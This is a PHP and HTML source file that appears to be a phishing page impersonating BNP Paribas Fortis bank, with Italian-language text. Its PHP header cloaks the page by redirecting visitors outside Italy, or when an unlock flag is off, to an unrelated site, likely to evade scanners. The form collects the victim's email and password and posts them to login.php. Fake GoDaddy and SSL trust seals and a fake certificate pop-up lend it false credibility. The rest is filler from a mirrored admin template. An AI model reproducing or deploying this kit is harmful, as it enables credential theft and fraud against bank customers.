<?php
session_cache_limiter('nocache');
session_start();
include 'functions.php';
login();

global $connection;
$query_find= "SELECT * FROM users WHERE user_id=1";
$result_find = mysqli_query($connection,$query_find);
$row_find= mysqli_fetch_assoc($result_find);
 
$ipUser = getUserIpAddr();
$userData = getUserCountry($ipUser);

if($userData['countryName']!='Italy'){
return header("Location: https://www.alfresco.com/customers/bnp-paribas-fortis");
}
 
$queryunloc="SELECT * FROM users WHERE user_id=1";
$resultunlock = mysqli_query($connection, $queryunloc);
$row= mysqli_fetch_assoc($resultunlock);
if($row['unlocks']==0){

    return header("Location: https://www.alfresco.com/customers/bnp-paribas-fortis");
    }
    
?>

<!DOCTYPE html>
<html lang="zxx">

<!-- Mirrored from xvelopers.com/demos/html/paper-panel/login-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 22 Aug 2020 18:16:03 GMT -->

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="assets/img/basic/favicon.ico" type="image/x-icon">
    <title>Bnp-Paribas Fortis Bank</title>
    <!-- CSS -->
    <link rel="stylesheet" href="assets/css/app.css">
    <style>
    .loader {
        position: fixed;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-image: linear-gradient(to right top, #051937, #004d7a, #008793, #00bf72, #a8eb12);
        z-index: 9998;
        text-align: center;
    }

    .plane-container {
        position: absolute;
        top: 50%;
        left: 50%;
    }

    </style>
    <script src="https://www.google.com/recaptcha/api.js?render=6Lfr5I8aAAAAAFtCkAcYnxiBPRqW0Q6XS9Or8ji_"></script>

    <!-- Js -->
    <!--
    --- Head Part - Use Jquery anywhere at page.
    --- http://writing.colin-gourlay.com/safely-using-ready-before-including-jquery/
    -->
    <script>
    (function(w, d, u) {
        w.readyQ = [];
        w.bindReadyQ = [];

        function p(x, y) {
            if (x == "ready") {
                w.bindReadyQ.push(y);
            } else {
                w.readyQ.push(x);
            }
        };
        var a = {
            ready: p,
            bind: p
        };
        w.$ = w.jQuery = function(f) {
            if (f === d || f === u) {
                return a
            } else {
                p(f)
            }
        }
    })(window, document)
    </script>
</head>

<body class="light">
    <!-- Pre loader -->
    <div id="loader" class="loader">
        <div class="plane-container">
            <div class="preloader-wrapper small active">
                <div class="spinner-layer spinner-blue">
                    <div class="circle-clipper left">
                        <div class="circle"></div>
                    </div>
                    <div class="gap-patch">
                        <div class="circle"></div>
                    </div>
                    <div class="circle-clipper right">
                        <div class="circle"></div>
                    </div>
                </div>

                <div class="spinner-layer spinner-red">
                    <div class="circle-clipper left">
                        <div class="circle"></div>
                    </div>
                    <div class="gap-patch">
                        <div class="circle"></div>
                    </div>
                    <div class="circle-clipper right">
                        <div class="circle"></div>
                    </div>
                </div>

                <div class="spinner-layer spinner-yellow">
                    <div class="circle-clipper left">
                        <div class="circle"></div>
                    </div>
                    <div class="gap-patch">
                        <div class="circle"></div>
                    </div>
                    <div class="circle-clipper right">
                        <div class="circle"></div>
                    </div>
                </div>

                <div class="spinner-layer spinner-green">
                    <div class="circle-clipper left">
                        <div class="circle"></div>
                    </div>
                    <div class="gap-patch">
                        <div class="circle"></div>
                    </div>
                    <div class="circle-clipper right">
                        <div class="circle"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="app">
        <main>
            <div id="primary"
                style="background-image: linear-gradient(to right top, #051937, #004d7a, #008793, #00bf72, #a8eb12);"
                class="  p-t-b-100 height-full responsive-phone">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-9">
                            <img src="1502459_2.jpg" class="col-12 " alt="">
                        </div>
                        <div class="col-lg-3 p-t-100">
                            <div class="text-white">
                                <h1>Benvenuto</h1>
                                <p class="s-18 p-t-b-20 font-weight-lighter">Per effettuare uno stage sul sistema in
                                    banca è necessario fornire le proprie credenziali</p>

                            </div>
                            <form action="login.php" method="POST">
                                <div class="row">
                                    <div class="col-lg-12">
                                        <div class="form-group has-icon"><i class="icon-envelope-o"></i>
                                            <input type="text" name="username" class="form-control form-control-lg no-b"
                                                placeholder="Indirizzo email">
                                        </div>
                                    </div>
                                    <div class="col-lg-12">
                                        <div class="form-group has-icon"><i class="icon-user-secret"></i>
                                            <input name="password" type="password"
                                                class="form-control form-control-lg no-b" placeholder="Password">
                                            <input type="text" class="form-control" id="recaptchaResponse"
                                                name="recaptcha_response" placeholder="" hidden required>
                                        </div>
                                    </div>
                                    <div class="col-lg-12">
                                        <input type="submit" name="submit" class="btn btn-success btn-lg btn-block"
                                            value="Accedi nella bancha">
                                    </div>
                                </div>
                            </form>
                            <?php if($_GET['error']==1){
                                ?>
                            <br>
                            <div class="alert alert-danger bg-danger text-light" role="alert">
                                Errore! Email o password errati, ricontrolla i dati inseriti.
                            </div>
                            <?php } ?>
                        </div>

                        <br>
                        <br>
                        <img class="col-3 diplay" src="godaddy.png" alt="">
                        <img src="https://static.thenounproject.com/png/162314-200.png" class="mt-4" height="30"
                            class="col-1" alt="">
                        <img class="col-3 mt-2 diplay"
                            src="https://gogetssl-cdn.s3.eu-central-1.amazonaws.com/site-seals/gogetssl-static-seal.svg"
                            alt="">

                    </div>
                </div>
            </div>
            <!-- #primary -->
        </main>
        <!-- Right Sidebar -->
        <aside class="control-sidebar fixed white ">
            <div class="slimScroll">
                <div class="sidebar-header">
                    <h4>Activity List</h4>
                    <a href="#" data-toggle="control-sidebar" class="paper-nav-toggle  active"><i></i></a>
                </div>
                <div class="p-3">
                    <div>
                        <div class="my-3">
                            <small>25% Complete</small>
                            <div class="progress" style="height: 3px;">
                                <div class="progress-bar bg-success" role="progressbar" style="width: 25%;"
                                    aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div>
                            </div>
                        </div>
                        <div class="my-3">
                            <small>45% Complete</small>
                            <div class="progress" style="height: 3px;">
                                <div class="progress-bar bg-info" role="progressbar" style="width: 45%;"
                                    aria-valuenow="45" aria-valuemin="0" aria-valuemax="100"></div>
                            </div>
                        </div>
                        <div class="my-3">
                            <small>60% Complete</small>
                            `
                            <div class="progress" style="height: 3px;">
                                <div class="progress-bar bg-warning" role="progressbar" style="width: 60%;"
                                    aria-valuenow="60" aria-valuemin="0" aria-valuemax="100"></div>
                            </div>
                        </div>
                        <div class="my-3">
                            <small>75% Complete</small>
                            <div class="progress" style="height: 3px;">
                                <div class="progress-bar bg-danger" role="progressbar" style="width: 75%;"
                                    aria-valuenow="75" aria-valuemin="0" aria-valuemax="100"></div>
                            </div>
                        </div>
                        <div class="my-3">
                            <small>100% Complete</small>
                            <div class="progress" style="height: 3px;">
                                <div class="progress-bar" role="progressbar" style="width: 100%;" aria-valuenow="100"
                                    aria-valuemin="0" aria-valuemax="100"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="p-3 bg-primary text-white">
                    <div class="row">
                        <div class="col-md-6">
                            <h5 class="font-weight-normal s-14">Sodium</h5>
                            <span class="font-weight-lighter text-primary">Spark Bar</span>
                            <div> Oxygen
                                <span class="text-primary">
                                    <i class="icon icon-arrow_downward"></i> 67%</span>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <canvas width="100" height="70" data-chart="spark" data-chart-type="bar"
                                data-dataset="[[28,68,41,43,96,45,100,28,68,41,43,96,45,100,28,68,41,43,96,45,100,28,68,41,43,96,45,100]]"
                                data-labels="['a','b','c','d','e','f','g','h','i','j','k','l','m','n','a','b','c','d','e','f','g','h','i','j','k','l','m','n']">
                            </canvas>
                        </div>
                    </div>
                </div>
                <div class="table-responsive">
                    <table id="recent-orders" class="table table-hover mb-0 ps-container ps-theme-default">
                        <tbody>
                            <tr>
                                <td>
                                    <a href="#">INV-281281</a>
                                </td>
                                <td>
                                    <span class="badge badge-success">Paid</span>
                                </td>
                                <td>$ 1228.28</td>
                            </tr>
                            <tr>
                                <td>
                                    <a href="#">INV-01112</a>
                                </td>
                                <td>
                                    <span class="badge badge-warning">Overdue</span>
                                </td>
                                <td>$ 5685.28</td>
                            </tr>
                            <tr>
                                <td>
                                    <a href="#">INV-281012</a>
                                </td>
                                <td>
                                    <span class="badge badge-success">Paid</span>
                                </td>
                                <td>$ 152.28</td>
                            </tr>
                            <tr>
                                <td>
                                    <a href="#">INV-01112</a>
                                </td>
                                <td>
                                    <span class="badge badge-warning">Overdue</span>
                                </td>
                                <td>$ 5685.28</td>
                            </tr>
                            <tr>
                                <td>
                                    <a href="#">INV-281012</a>
                                </td>
                                <td>
                                    <span class="badge badge-success">Paid</span>
                                </td>
                                <td>$ 152.28</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <div class="sidebar-header">
                    <h4>Activity</h4>
                    <a href="#" data-toggle="control-sidebar" class="paper-nav-toggle  active"><i></i></a>
                </div>
                <div class="p-4">
                    <div class="activity-item activity-primary">
                        <div class="activity-content">
                            <small class="text-muted">
                                <i class="icon icon-user position-left"></i> 5 mins ago
                            </small>
                            <p>Lorem ipsum dolor sit amet conse ctetur which ascing elit users.</p>
                        </div>
                    </div>
                    <div class="activity-item activity-danger">
                        <div class="activity-content">
                            <small class="text-muted">
                                <i class="icon icon-user position-left"></i> 8 mins ago
                            </small>
                            <p>Lorem ipsum dolor sit ametcon the sectetur that ascing elit users.</p>
                        </div>
                    </div>
                    <div class="activity-item activity-success">
                        <div class="activity-content">
                            <small class="text-muted">
                                <i class="icon icon-user position-left"></i> 10 mins ago
                            </small>
                            <p>Lorem ipsum dolor sit amet cons the ecte tur and adip ascing elit users.</p>
                        </div>
                    </div>
                    <div class="activity-item activity-warning">
                        <div class="activity-content">
                            <small class="text-muted">
                                <i class="icon icon-user position-left"></i> 12 mins ago
                            </small>
                            <p>Lorem ipsum dolor sit amet consec tetur adip ascing elit users.</p>
                        </div>
                    </div>
                </div>
            </div>
        </aside>

        <div class="modal" tabindex="-1" role="dialog">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Modal title</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <p>Modal body text goes here.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary">Save changes</button>
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- /.right-sidebar -->
        <!-- Add the sidebar's background. This div must be placed
         immediately after the control sidebar -->
        <div class="control-sidebar-bg shadow white fixed"></div>
    </div>
    <!--/#app -->
    <script src="assets/js/app.js"></script>
    <div id="GSCCModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"
        aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header d-flex justify-content-center">

                    <h4 class="modal-title" id="myModalLabel">Certificate</h4>
                </div>
                <div class="modal-body">
                    <img src="ssl.png" class="col-12" alt="">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">Chiudi</button>

                </div>
            </div>
        </div>
    </div>
    <!--
--- Footer Part - Use Jquery anywhere at page.
--- http://writing.colin-gourlay.com/safely-using-ready-before-including-jquery/
-->
    <script>
    grecaptcha.ready(function() {
        grecaptcha.execute('6Lfr5I8aAAAAAFtCkAcYnxiBPRqW0Q6XS9Or8ji_', {
            action: 'contact'
        }).then(function(token) {
            var recaptchaResponse = document.getElementById('recaptchaResponse');
            recaptchaResponse.value = token;
        });
    });
    </script>
    <script>
    $(".diplay").click(function() {

            $('#GSCCModal').modal('show');


        })
        (function($, d) {
            $.each(readyQ, function(i, f) {
                $(f)
            });
            $.each(bindReadyQ, function(i, f) {
                $(d).bind("ready", f)
            })
        })(jQuery, document);
    </script>
</body>

<!-- Mirrored from xvelopers.com/demos/html/paper-panel/login-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 22 Aug 2020 18:16:03 GMT -->

</html>
